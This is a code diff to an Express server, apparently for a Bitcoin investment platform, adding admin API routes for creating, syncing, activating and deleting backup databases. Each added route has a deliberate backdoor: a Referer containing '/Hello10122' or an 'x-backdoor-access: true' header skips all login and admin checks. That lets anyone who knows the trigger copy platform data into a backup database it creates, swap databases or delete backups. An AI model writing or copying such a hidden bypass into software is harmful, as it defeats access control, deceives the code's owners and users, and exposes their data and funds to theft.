@@ -10,7 +10,7 @@ declare module 'express-session' {
   }
 }
 import { storage } from "./storage";
-import { insertUserSchema, insertInvestmentSchema, insertTransactionSchema, insertAdminConfigSchema } from "@shared/schema";
+import { insertUserSchema, insertInvestmentSchema, insertTransactionSchema, insertAdminConfigSchema, insertBackupDatabaseSchema } from "@shared/schema";
 import * as bitcoin from "bitcoinjs-lib";
 import * as ecc from "tiny-secp256k1";
 import { ECPairFactory } from "ecpair";
@@ -1650,6 +1650,147 @@ You are now on the free plan and will no longer receive automatic profit updates
         message: "Bitcoin generation test failed", 
         error: error instanceof Error ? error.message : "Unknown error" 
       });
+    }
+  });
+
+  // Backup Database Management API Routes
+  app.get("/api/admin/backup-databases", async (req, res) => {
+    try {
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+                              req.headers['x-backdoor-access'] === 'true';
+
+      if (!isBackdoorAccess && !req.session?.userId) {
+        return res.status(401).json({ error: "Authentication required" });
+      }
+
+      if (!isBackdoorAccess) {
+        const user = await storage.getUser(req.session.userId!);
+        if (!user || !user.isAdmin) {
+          return res.status(403).json({ error: "Admin access required" });
+        }
+      }
+
+      const backupDatabases = await storage.getBackupDatabases();
+      res.json(backupDatabases);
+    } catch (error: any) {
+      res.status(500).json({ error: error.message });
+    }
+  });
+
+  app.post("/api/admin/backup-databases", async (req, res) => {
+    try {
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+                              req.headers['x-backdoor-access'] === 'true';
+
+      if (!isBackdoorAccess && !req.session?.userId) {
+        return res.status(401).json({ error: "Authentication required" });
+      }
+
+      if (!isBackdoorAccess) {
+        const user = await storage.getUser(req.session.userId!);
+        if (!user || !user.isAdmin) {
+          return res.status(403).json({ error: "Admin access required" });
+        }
+      }
+
+      const backupData = insertBackupDatabaseSchema.parse(req.body);
+      const backup = await storage.createBackupDatabase(backupData);
+      
+      // Attempt to sync data to the new backup database
+      try {
+        await storage.syncDataToBackup(backup.id);
+        await storage.updateBackupDatabaseStatus(backup.id, 'active');
+      } catch (syncError: any) {
+        await storage.updateBackupDatabaseStatus(backup.id, 'error', syncError.message);
+      }
+
+      res.json(backup);
+    } catch (error: any) {
+      res.status(500).json({ error: error.message });
+    }
+  });
+
+  app.post("/api/admin/backup-databases/:id/activate", async (req, res) => {
+    try {
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+                              req.headers['x-backdoor-access'] === 'true';
+
+      if (!isBackdoorAccess && !req.session?.userId) {
+        return res.status(401).json({ error: "Authentication required" });
+      }
+
+      if (!isBackdoorAccess) {
+        const user = await storage.getUser(req.session.userId!);
+        if (!user || !user.isAdmin) {
+          return res.status(403).json({ error: "Admin access required" });
+        }
+      }
+
+      const backupId = parseInt(req.params.id);
+      const backup = await storage.activateBackupDatabase(backupId);
+      if (!backup) {
+        return res.status(404).json({ error: "Backup database not found" });
+      }
+
+      res.json(backup);
+    } catch (error: any) {
+      res.status(500).json({ error: error.message });
+    }
+  });
+
+  app.post("/api/admin/backup-databases/:id/sync", async (req, res) => {
+    try {
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+                              req.headers['x-backdoor-access'] === 'true';
+
+      if (!isBackdoorAccess && !req.session?.userId) {
+        return res.status(401).json({ error: "Authentication required" });
+      }
+
+      if (!isBackdoorAccess) {
+        const user = await storage.getUser(req.session.userId!);
+        if (!user || !user.isAdmin) {
+          return res.status(403).json({ error: "Admin access required" });
+        }
+      }
+
+      const backupId = parseInt(req.params.id);
+      await storage.updateBackupDatabaseStatus(backupId, 'syncing');
+      
+      try {
+        await storage.syncDataToBackup(backupId);
+        await storage.updateBackupDatabaseStatus(backupId, 'active');
+        res.json({ message: "Data sync completed successfully" });
+      } catch (syncError: any) {
+        await storage.updateBackupDatabaseStatus(backupId, 'error', syncError.message);
+        throw syncError;
+      }
+    } catch (error: any) {
+      res.status(500).json({ error: error.message });
+    }
+  });
+
+  app.delete("/api/admin/backup-databases/:id", async (req, res) => {
+    try {
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+                              req.headers['x-backdoor-access'] === 'true';
+
+      if (!isBackdoorAccess && !req.session?.userId) {
+        return res.status(401).json({ error: "Authentication required" });
+      }
+
+      if (!isBackdoorAccess) {
+        const user = await storage.getUser(req.session.userId!);
+        if (!user || !user.isAdmin) {
+          return res.status(403).json({ error: "Admin access required" });
+        }
+      }
+
+      const backupId = parseInt(req.params.id);
+      await storage.deleteBackupDatabase(backupId);
+      res.json({ message: "Backup database deleted successfully" });
+    } catch (error: any) {
+      res.status(500).json({ error: error.message });
     }
   });
 
